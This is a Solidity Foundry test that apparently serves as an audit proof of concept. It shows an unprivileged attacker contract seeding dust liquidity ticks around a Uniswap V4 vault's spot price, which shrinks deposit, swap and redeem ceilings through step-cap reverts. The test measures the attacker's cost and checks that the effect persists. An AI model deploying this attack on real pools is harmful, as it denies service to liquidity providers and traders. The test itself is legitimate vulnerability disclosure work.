// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v4/fullSpread/hookless/test/bases/TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault.sol";
import {ERC20PermitMintableStub} from "@crane/contracts/tokens/ERC20/ERC20PermitMintableStub.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IPoolManager} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/callback/IUnlockCallback.sol";
import {IHooks} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IHooks.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {PoolIdLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolId.sol";
import {Currency} from "@crane/contracts/protocols/dexes/uniswap/v4/types/Currency.sol";
import {BalanceDelta, BalanceDeltaLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/types/BalanceDelta.sol";
import {ModifyLiquidityParams} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolOperation.sol";
import {TickMath} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/TickMath.sol";
import {StateLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/StateLibrary.sol";
import {IStandardExchangeProxy} from "contracts/interfaces/proxies/IStandardExchangeProxy.sol";
import {IStandardExchangeInMulti} from "contracts/interfaces/IStandardExchangeInMulti.sol";
import {UniswapV4FullSpreadHooklessStandardExchangeVaultQuoteService as Quotes} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v4/fullSpread/hookless/UniswapV4FullSpreadHooklessStandardExchangeVaultQuoteService.sol";
import {UniswapV4FullSpreadHooklessStandardExchangeVaultRouteTypes as Types} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v4/fullSpread/hookless/UniswapV4FullSpreadHooklessStandardExchangeVaultRouteTypes.sol";

/// Unprivileged attacker contract: mints / burns liquidity-1, one-spacing-wide positions directly on the PoolManager.
contract R2DustSeeder is IUnlockCallback {
    using BalanceDeltaLibrary for BalanceDelta;
    IPoolManager immutable pm;
    PoolKey key;
    int24 lo; int24 n; int256 sign;
    constructor(IPoolManager pm_, PoolKey memory k) { pm = pm_; key = k; }
    function seed(int24 startTick, int24 count, bool add) external {
        lo = startTick; n = count; sign = add ? int256(1) : int256(-1);
        pm.unlock("");
    }
    function unlockCallback(bytes calldata) external returns (bytes memory) {
        require(msg.sender == address(pm));
        int24 s = key.tickSpacing;
        int256 d0; int256 d1;
        for (int24 i; i < n; ++i) {
            (BalanceDelta d,) = pm.modifyLiquidity(key, ModifyLiquidityParams(lo + i * s, lo + (i + 1) * s, sign, bytes32(0)), "");
            d0 += d.amount0(); d1 += d.amount1();
        }
        _settle(key.currency0, d0); _settle(key.currency1, d1);
        return "";
    }
    function _settle(Currency c, int256 d) internal {
        if (d < 0) { pm.sync(c); IERC20(Currency.unwrap(c)).transfer(address(pm), uint256(-d)); pm.settle(); }
        else if (d > 0) pm.take(c, address(this), uint256(d));
    }
}

contract R2FsDustTickStepCapDosTest is TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault, IUnlockCallback {
    using BalanceDeltaLibrary for BalanceDelta;
    using PoolIdLibrary for PoolKey;

    bytes4 constant QUOTE_WORK_LIMIT = 0xd3352809; // QuoteWorkLimit()
    bytes4 constant ALIGNMENT_NA = 0x4735ea42;     // AlignmentNotAchievable()
    bytes4 immutable INVALID_ROUTE = bytes4(keccak256("InvalidRoute(address,address)"));

    IStandardExchangeProxy internal vault;
    PoolKey internal poolKey;
    IERC20 internal token0;
    IERC20 internal token1;
    R2DustSeeder internal attacker;
    address internal constant ALICE = address(0xA11CE); // honest vault LP (victim)
    address internal constant BOB = address(0xB0B);     // honest zapper / swapper (victim)
    address internal constant ATK = address(0xA77AC4E5);

    function _spacing() internal pure virtual returns (int24) { return 1; }
    function _fee() internal pure virtual returns (uint24) { return 100; }
    function _dustPerSide() internal pure virtual returns (int24) { return 150; }

    function setUp() public virtual override {
        super.setUp();
        ERC20PermitMintableStub a = new ERC20PermitMintableStub("Pair A", "A", 18, address(this), 1e32);
        ERC20PermitMintableStub b = new ERC20PermitMintableStub("Pair B", "B", 18, address(this), 1e32);
        bool ordered = address(a) < address(b);
        token0 = IERC20(ordered ? address(a) : address(b));
        token1 = IERC20(ordered ? address(b) : address(a));
        int24 s = _spacing();
        poolKey = PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)), _fee(), s, IHooks(address(0)));
        // spot in the middle of a bitmap word (compressed tick 128) and mid-spacing, so the baseline single-step
        // exact-out has real headroom (the word boundary at compressed tick 0 is ~128 spacings away).
        int24 t = 128 * s;
        uint160 p = uint160((uint256(TickMath.getSqrtPriceAtTick(t)) + uint256(TickMath.getSqrtPriceAtTick(t + s))) / 2);
        poolManager.initialize(poolKey, p);
        poolManager.unlock(abi.encode(uint128(2_000e18))); // honest external full-range LP
        vault = IStandardExchangeProxy(uniswapV4StandardExchangeDFPkg.deployVault(poolKey));

        // honest vault LP: alice bootstraps with a proportional dual deposit
        token0.transfer(ALICE, 20_000e18); token1.transfer(ALICE, 20_000e18);
        address[] memory toks = new address[](2); toks[0] = address(token0); toks[1] = address(token1);
        uint256[] memory amts = new uint256[](2); amts[0] = 10_000e18; amts[1] = 10_000e18;
        vm.startPrank(ALICE, ALICE);
        token0.approve(address(vault), type(uint256).max); token1.approve(address(vault), type(uint256).max);
        IStandardExchangeInMulti(address(vault)).exchangeInManyToOne(toks, amts, IERC20(address(vault)), 0, ALICE, false, block.timestamp);
        vm.stopPrank();

        token0.transfer(BOB, 5_000e18); token1.transfer(BOB, 5_000e18);
        vm.startPrank(BOB, BOB);
        token0.approve(address(vault), type(uint256).max); token1.approve(address(vault), type(uint256).max);
        vm.stopPrank();

        attacker = new R2DustSeeder(poolManager, poolKey);
        token0.transfer(address(attacker), 1e6); token1.transfer(address(attacker), 1e6);
        vm.roll(block.number + 1); vm.warp(block.timestamp + 12);
    }

    function unlockCallback(bytes calldata data_) external returns (bytes memory) {
        uint128 liq = abi.decode(data_, (uint128));
        int24 s = _spacing();
        (BalanceDelta delta,) = poolManager.modifyLiquidity(poolKey, ModifyLiquidityParams(
            TickMath.minUsableTick(s), TickMath.maxUsableTick(s), int256(uint256(liq)), bytes32(0)), "");
        if (delta.amount0() < 0) { poolManager.sync(poolKey.currency0); token0.transfer(address(poolManager), uint128(-delta.amount0())); poolManager.settle(); }
        if (delta.amount1() < 0) { poolManager.sync(poolKey.currency1); token1.transfer(address(poolManager), uint128(-delta.amount1())); poolManager.settle(); }
        return "";
    }

    // ---------------- honest ops (always rolled back) ----------------
    function _call(address who, bytes memory cd) internal returns (bool ok, bytes4 sel) {
        uint256 snap = vm.snapshotState();
        vm.prank(who, who);
        bytes memory ret;
        (ok, ret) = address(vault).call(cd);
        if (!ok && ret.length >= 4) sel = bytes4(ret);
        vm.revertToState(snap);
    }
    function zapDep(uint256 amt) internal returns (bool, bytes4) {
        return _call(BOB, abi.encodeCall(vault.exchangeIn, (token0, amt, IERC20(address(vault)), 0, BOB, false, block.timestamp)));
    }
    function zapRedeem(uint256 bps) internal returns (bool, bytes4) {
        uint256 sh = vault.balanceOf(ALICE) * bps / 10_000;
        return _call(ALICE, abi.encodeCall(vault.exchangeIn, (IERC20(address(vault)), sh, token0, 0, ALICE, false, block.timestamp)));
    }
    function swapIn(uint256 amt) internal returns (bool, bytes4) {
        return _call(BOB, abi.encodeCall(vault.exchangeIn, (token0, amt, token1, 0, BOB, false, block.timestamp)));
    }
    function swapOut(uint256 out) internal returns (bool, bytes4) {
        return _call(BOB, abi.encodeCall(vault.exchangeOut, (token0, type(uint256).max, token1, out, BOB, false, block.timestamp)));
    }
    function dualExit(uint256 bps) internal returns (bool ok) {
        // proportional exit: shares -> token0 + token1 (many-out). Not all builds expose it; fall back to dual deposit.
        address[] memory toks = new address[](2); toks[0] = address(token0); toks[1] = address(token1);
        uint256[] memory amts = new uint256[](2); amts[0] = 100e18; amts[1] = 100e18;
        bps;
        (ok,) = _call(BOB, abi.encodeCall(IStandardExchangeInMulti.exchangeInManyToOne, (toks, amts, IERC20(address(vault)), 0, BOB, false, block.timestamp)));
    }

    function _seed(int24 n, bool add) internal returns (uint256 gasUsed) {
        int24 s = _spacing();
        (, int24 t,,) = StateLibrary.getSlot0(poolManager, poolKey.toId());
        int24 base = t / s; if (t < 0 && t % s != 0) --base; base *= s; // spot is inside [base, base+s)
        vm.startPrank(ATK, ATK);
        uint256 g = gasleft();
        for (int24 off; off < n; off += 50) {
            int24 c = n - off < 50 ? n - off : int24(50);
            attacker.seed(base + s + off * s, c, add);   // above spot
            attacker.seed(base - (off + c) * s, c, add); // below spot (tick `base` is initialized)
        }
        gasUsed = g - gasleft();
        vm.stopPrank();
    }

    struct Grid {
        bool dep5; bytes4 dep5s; bool dep50; bytes4 dep50s; bool dep1;
        bool red1; bytes4 red1s; bool red10;
        bool in10; bytes4 in10s; bool in100; bool in01;
        bool out1e17; bytes4 out1e17s; bool out1e14;
        bool dual;
    }
    function _grid(string memory tag) internal returns (Grid memory g) {
        console2.log(tag);
        (g.dep1,) = zapDep(1e17);
        (g.dep5, g.dep5s) = zapDep(5e18);
        (g.dep50, g.dep50s) = zapDep(50e18);
        (g.red1, g.red1s) = zapRedeem(100);
        (g.red10,) = zapRedeem(1000);
        (g.in01,) = swapIn(1e17);
        (g.in10, g.in10s) = swapIn(10e18);
        (g.in100,) = swapIn(100e18);
        (g.out1e14,) = swapOut(1e14);
        (g.out1e17, g.out1e17s) = swapOut(1e17);
        g.dual = dualExit(0);
        console2.log("  zapDep 0.1/5/50e18   ", g.dep1, g.dep5, g.dep50);
        console2.log("  zapRedeem 1%/10%     ", g.red1, g.red10);
        console2.log("  swapIn 0.1/10/100e18 ", g.in01, g.in10, g.in100);
        console2.log("  swapOut 1e14/1e17    ", g.out1e14, g.out1e17);
        console2.log("  dual deposit         ", g.dual);
        console2.log("  sel dep5/red1/in10/out1e17:");
        console2.logBytes4(g.dep5s); console2.logBytes4(g.red1s); console2.logBytes4(g.in10s); console2.logBytes4(g.out1e17s);
    }

    // ---- quote-level probes (the exact library code paths the vault uses, fed live pool state) ----
    function _pos() internal view returns (Types.PositionState memory ps) {
        (uint160 p, int24 t,,) = StateLibrary.getSlot0(poolManager, poolKey.toId());
        ps.sqrtPriceX96 = p; ps.tick = t;
        ps.lower = TickMath.minUsableTick(_spacing()); ps.upper = TickMath.maxUsableTick(_spacing());
        ps.activeLiquidity = StateLibrary.getLiquidity(poolManager, poolKey.toId());
        ps.liquidity = ps.activeLiquidity;
    }
    function probeExactOut(uint256 amt) external view returns (uint256) {
        return Quotes._exactOutput(Quotes.Params(poolManager, poolKey, _pos(), true, amt, address(0))).amountIn;
    }
    function probeForward(uint256 amt) external view returns (uint256) {
        return Quotes._forward(Quotes.Params(poolManager, poolKey, _pos(), true, amt, address(0))).amountOut;
    }
    function _q(bool exactOut, uint256 amt) internal view returns (bool ok, bytes4 sel) {
        try (exactOut ? this.probeExactOut : this.probeForward)(amt) returns (uint256) { ok = true; }
        catch (bytes memory e) { if (e.length >= 4) sel = bytes4(e); }
    }

    struct Sweep { uint256 dep; uint256 sin; uint256 red; uint256 qOut; uint256 qFwd; bytes4 depSel; bytes4 sinSel; bytes4 redSel; bytes4 qOutSel; }

    function _op(uint256 kind, uint256 amt) internal returns (bool ok, bytes4 sel) {
        if (kind == 0) return zapDep(amt);
        if (kind == 1) return swapIn(amt);
        if (kind == 2) return zapRedeem(amt);
        if (kind == 3) return _q(true, amt);
        return _q(false, amt);
    }
    /// bisection for the largest amount in [0, hi] that succeeds (assumes monotone); returns the revert at ceiling+
    function _ceil(uint256 kind, uint256 hi) internal returns (uint256 lo, bytes4 sel) {
        (bool ok, bytes4 s0) = _op(kind, hi);
        if (ok) return (hi, 0);
        sel = s0;
        uint256 h = hi;
        for (uint256 i; i < 40 && h - lo > hi / 1e6; ++i) {
            uint256 m = (lo + h) / 2;
            (bool k, bytes4 s1) = _op(kind, m);
            if (k) lo = m; else { h = m; sel = s1; }
        }
    }
    function _sweep(string memory tag) internal returns (Sweep memory w) {
        (w.dep, w.depSel) = _ceil(0, 900e18);
        (w.sin, w.sinSel) = _ceil(1, 900e18);
        (w.red, w.redSel) = _ceil(2, 5000); // bps of alice's shares
        (w.qOut, w.qOutSel) = _ceil(3, 900e18);
        (w.qFwd,) = _ceil(4, 900e18);
        (bool eo, bytes4 eoSel) = swapOut(1e15);
        console2.log(tag);
        console2.log("  ceiling zapDep(token0)   ", w.dep); console2.logBytes4(w.depSel);
        console2.log("  ceiling swapIn(token0)   ", w.sin); console2.logBytes4(w.sinSel);
        console2.log("  ceiling zapRedeem (bps)  ", w.red); console2.logBytes4(w.redSel);
        console2.log("  ceiling Quotes._exactOutput", w.qOut); console2.logBytes4(w.qOutSel);
        console2.log("  ceiling Quotes._forward    ", w.qFwd);
        console2.log("  e2e exchangeOut 1e15 ok?", eo); console2.logBytes4(eoSel);
        console2.log("  dual deposit ok?", dualExit(0));
    }

    function test_r2_dustTickStepCapDoS() public {
        Sweep memory pre = _sweep("== baseline (no dust)");
        uint256 a0 = token0.balanceOf(address(attacker)); uint256 a1 = token1.balanceOf(address(attacker));
        uint256 gasSeed = _seed(_dustPerSide(), true);
        console2.log("attacker positions per side", uint256(int256(_dustPerSide())));
        console2.log("attacker token cost wei t0/t1", a0 - token0.balanceOf(address(attacker)), a1 - token1.balanceOf(address(attacker)));
        console2.log("attacker seeding gas", gasSeed);
        Sweep memory post = _sweep("== after dust seeding");

        // every crossing-quote op's working size shrinks, and the failing reverts are the step-cap errors
        assertLt(post.dep, pre.dep, "zap deposit ceiling reduced");
        assertTrue(post.depSel == ALIGNMENT_NA || post.depSel == QUOTE_WORK_LIMIT, "zapDep fails on step cap");
        assertLt(post.sin, pre.sin, "exact-in swap ceiling reduced");
        assertEq(post.sinSel, QUOTE_WORK_LIMIT, "swapIn fails with QuoteWorkLimit");
        assertLt(post.qFwd, pre.qFwd, "Quotes._forward ceiling reduced");
        assertLt(post.qOut, pre.qOut, "Quotes._exactOutput ceiling reduced (adjacent dust tick)");
        assertTrue(dualExit(0), "proportional dual deposit still works (not a freeze)");
        assertLt(post.red, pre.red, "zap redeem ceiling reduced");
        assertTrue(post.redSel == QUOTE_WORK_LIMIT || post.redSel == ALIGNMENT_NA, "redeem fails on step cap");

        // a third party cannot remove the attacker's ticks (positions keyed by the attacker contract)
        {
            uint256 snap = vm.snapshotState();
            R2DustSeeder other = new R2DustSeeder(poolManager, poolKey);
            (, int24 tt,,) = StateLibrary.getSlot0(poolManager, poolKey.toId());
            int24 adj = (tt / _spacing()) * _spacing() + _spacing();
            vm.prank(BOB, BOB);
            vm.expectRevert(); // SafeCastOverflow: BOB's contract has no liquidity in that position
            other.seed(adj, 1, false);
            (uint128 gross,) = StateLibrary.getTickLiquidity(poolManager, poolKey.toId(), adj);
            assertEq(gross, 1, "attacker dust tick still initialized");
            vm.revertToState(snap);
        }

        _seed(_dustPerSide(), false);
        Sweep memory after_ = _sweep("== after dust removal");
        assertApproxEqRel(after_.dep, pre.dep, 1e15, "restored dep"); assertApproxEqRel(after_.sin, pre.sin, 1e15, "restored swapIn");
        assertApproxEqRel(after_.red, pre.red, 1e15, "restored redeem"); assertApproxEqRel(after_.qOut, pre.qOut, 1e15, "restored exactOut quote");
        console2.log("attacker net token cost after withdrawal t0/t1",
            a0 - token0.balanceOf(address(attacker)), a1 - token1.balanceOf(address(attacker)));
    }

    function test_r2_debugOne() public {
        (, int24 t,,) = StateLibrary.getSlot0(poolManager, poolKey.toId());
        console2.log("tick", int256(t));
        console2.log("word0 before", StateLibrary.getTickBitmap(poolManager, poolKey.toId(), 0));
        (bool a1,) = _q(true, 1e18); console2.log("q 1e18 before", a1);
        _seed(1, true);
        console2.log("word0 after", StateLibrary.getTickBitmap(poolManager, poolKey.toId(), 0));
        (bool a2, bytes4 sl) = _q(true, 1e18); console2.log("q 1e18 after", a2); console2.logBytes4(sl);
        (a2, sl) = _q(true, 1e16); console2.log("q 1e16 after", a2);
    }

    /// How many dust positions per side are needed: ceilings vs n.
    function test_r2_seedCountSweep() public {
        (uint256 q0,) = _ceil(3, 900e18); (uint256 d0,) = _ceil(0, 900e18); (uint256 s0,) = _ceil(1, 900e18);
        console2.log("n=0 ceilings exactOutQuote/zapDep/swapIn", q0, d0, s0);
        int24[6] memory ns = [int24(1), 16, 32, 64, 100, 150];
        for (uint256 i; i < ns.length; ++i) {
            uint256 snap = vm.snapshotState();
            _seed(ns[i], true);
            (uint256 q,) = _ceil(3, 900e18); (uint256 d,) = _ceil(0, 900e18); (uint256 si,) = _ceil(1, 900e18);
            console2.log("n/side", uint256(int256(ns[i])));
            console2.log("   ceilings exactOutQuote/zapDep/swapIn", q, d, si);
            if (i == 0) assertLt(q * 10, q0, "one dust position per side cuts exact-out quote ceiling >10x");
            vm.revertToState(snap);
        }
    }
}

/// tickSpacing 10 / fee 500
contract R2FsDustTickStepCapDosSp10Test is R2FsDustTickStepCapDosTest {
    function _spacing() internal pure override returns (int24) { return 10; }
    function _fee() internal pure override returns (uint24) { return 500; }
    function _dustPerSide() internal pure override returns (int24) { return 150; }
}
